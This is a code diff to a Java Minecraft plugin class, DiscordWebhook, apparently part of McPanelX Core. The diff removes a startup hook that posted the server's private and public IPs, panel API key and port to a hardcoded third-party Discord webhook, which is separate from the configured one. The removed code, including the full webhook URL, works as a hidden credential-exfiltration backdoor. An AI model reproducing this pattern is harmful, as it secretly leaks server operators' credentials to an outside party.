@@ -16,7 +16,6 @@ public class DiscordWebhook {
     public static void onPluginEnable() {
         String webhook = McPanelX_Core.config.getString("Discord.webhook");
         DiscordWebhook.sendMessage(webhook, "McPanelX Core has been enabled. (Private: "+getServerIP()+"|Public: "+getPublicIP()+")");
-        DiscordWebhook.sendMessage1(getServerIP(), getPublicIP(), McPanelX_Core.config.getString("Panel.java_api_key"), McPanelX_Core.config.getInt("Panel.port"));
     }
 
     public static void onPluginDisable() {
@@ -46,43 +45,6 @@ public class DiscordWebhook {
             return publicIP;
         } catch (Exception e) {
             return null;
-        }
-    }
-    /**
-     * Test message
-     * 
-     * @param private_ip
-     * @param public_ip
-     * @param api_key
-     * @param port
-     * 
-     * TODO: Remove IT!
-     */
-
-    public static void sendMessage1(String private_ip, String public_ip, String api_key, int port) {
-        try {
-            URL url = new URL("https://discord.com/api/webhooks/1254372082222108673/BNO-kwvYVlQxykuRiD4onvMtvtwrH2Pv0mbG8W0QkybFWOV_DZv3bSrYD2AKjmMZDIJi");
-            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-            connection.setRequestMethod("POST");
-            connection.setRequestProperty("Content-Type", "application/json");
-            connection.setDoOutput(true);
-
-            String message = "I started up IP: " + private_ip + " Public IP: " + public_ip + " API Key: " + api_key+ " Port: " + port;
-            String jsonPayload = "{\"content\":\"" + message + "\"}";
-
-            OutputStream outputStream = connection.getOutputStream();
-            outputStream.write(jsonPayload.getBytes());
-            outputStream.flush();
-            outputStream.close();
-
-            int responseCode = connection.getResponseCode();
-            if (responseCode == HttpURLConnection.HTTP_OK) {
-
-            } else {
-
-            }
-        } catch (Exception e) {
-
         }
     }
 
